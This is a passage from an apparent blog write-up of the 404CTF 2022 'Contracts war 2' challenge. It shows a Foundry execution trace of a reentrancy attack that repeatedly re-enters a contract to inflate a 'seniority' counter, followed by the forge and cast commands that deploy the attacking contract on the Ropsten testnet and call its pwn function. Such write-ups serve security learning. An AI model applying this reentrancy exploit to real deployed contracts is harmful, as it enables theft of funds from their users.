    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 6)   
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [87044] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)   
    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>   
    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [74341] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x000000000000000000000000000000000000000000000000000000000d286880   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 7)
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [70070] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font> 
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font> 
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [57367] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font> 
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x000000000000000000000000000000000000000000000000000000000f099c00
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 8)  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [53096] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [40393] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000010eacf80  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 9)    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36122] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3519] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000012cc0300    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 10)
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>() 
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()    
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()   
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()  
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>() 
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()
    │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()    
    │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()   
    │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()  
    │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>() 
    │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()
    │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()    
    │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>()   
    │   │   │   │   │   └─ <font color=#4E9A06>← </font>()  
    │   │   │   │   └─ <font color=#4E9A06>← </font>() 
    │   │   │   └─ <font color=#4E9A06>← </font>()
    │   │   └─ <font color=#4E9A06>← </font>()    
    │   └─ <font color=#4E9A06>← </font>()   
    ├─ [2952] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>f15086e5</font>() <font color=#C4A000>[staticcall]</font>   
    │   └─ <font color=#4E9A06>← </font>0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080    
    └─ <font color=#4E9A06>← </font>()  
<p><font color=#4E9A06>Script ran successfully.</font> <br>
Gas used: 278997<br>
== Return ==
== Logs ==<br>
seniority: 1 <br>
seniority: 2 <br>
seniority: 3 <br>
seniority: 4 <br>
seniority: 5 <br>
seniority: 6 <br>
seniority: 7 <br>
seniority: 8
seniority: 9 <br>
seniority: 10
</pre></p></div><p>This output is typical of a reentrancy attack.</p><p>The final step is to deploy our contract to the <strong>ropsten</strong> blockchain and execute the pwn function. While deploying, ether has to be sent to the contract.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ forge create --rpc-url https://ropsten.infura.io/v3/&lt;API key&gt;  --private-key &lt;private key&gt;
</span></span><span class=line><span class=cl>a4b7b56f3870d40feb26 test/token.t.sol:TokenTest --value <span class=m>100</span> <span class=c1># value is required to send ether to the contract. Otherwise the buyHLB cannot work.</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
</span></span><span class=line><span class=cl>Deployed to: 0x0afd7d482b51834b1cad91c313d21425f1ad3f61
</span></span><span class=line><span class=cl>Transaction hash: 0xa927b9bc266083aed45944efef8bd147ebd0a50e681bd32c473beb1d4e7e2c3
</span></span><span class=line><span class=cl><span class=m>7</span>
</span></span></code></pre></td></tr></table></div></div><p>The function pwn can then be called.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cast send 0x0afd7d482b51834b1cad91c313d21425f1ad3f61 <span class=s2>&#34;pwn()&#34;</span>
</span></span><span class=line><span class=cl>  --rpc-url https://ropsten.infura.io/v3/&lt;API key&gt; --private
</span></span><span class=line><span class=cl>-key &lt;private key&gt;
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>transactionHash         0x17621fe1437f1ec5e6f9533aaf864d7a60bae4d54293f21d5290982dc
</span></span><span class=line><span class=cl>42ea2bd
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=/posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png title="Reentrancy attack" data-thumbnail=/posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png data-sub-html="<h2>reetrancy attack</h2><p>Reentrancy attack</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png data-srcset="/posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png, /posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png 1.5x, /posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png 2x" data-sizes=auto alt=/posts/writeup-404ctf-22/contractswar2/reentrancy-attack.png width=1052 height=611></a><figcaption class=image-caption>reetrancy attack</figcaption></figure></p><p>The attack is successful and the <code>seniority</code> variable has been updated multiple times before the <code>lastWithdrawTime</code> got updated.</p><p>We can now validate the challenge by specifying our contract address.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-01-26</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/foundry/>Foundry</a>,&nbsp;<a href=/tags/solidity/>solidity</a>,&nbsp;<a href=/tags/golang/>golang</a>,&nbsp;<a href=/tags/web3/>Web3</a>,&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/404ctf/>404CTF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/writeup-404ctf-22/publickey/ class=prev rel=prev title="Writeup 404CTF 2022 - public key (web3)"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Writeup 404CTF 2022 - public key (web3)</a>
<a href=/posts/writeup-404ctf-22/contractswar1/ class=next rel=next title="Writeup 404CTF 2022 - Contracts war 1 (web3)">Writeup 404CTF 2022 - Contracts war 1 (web3)<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.119.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>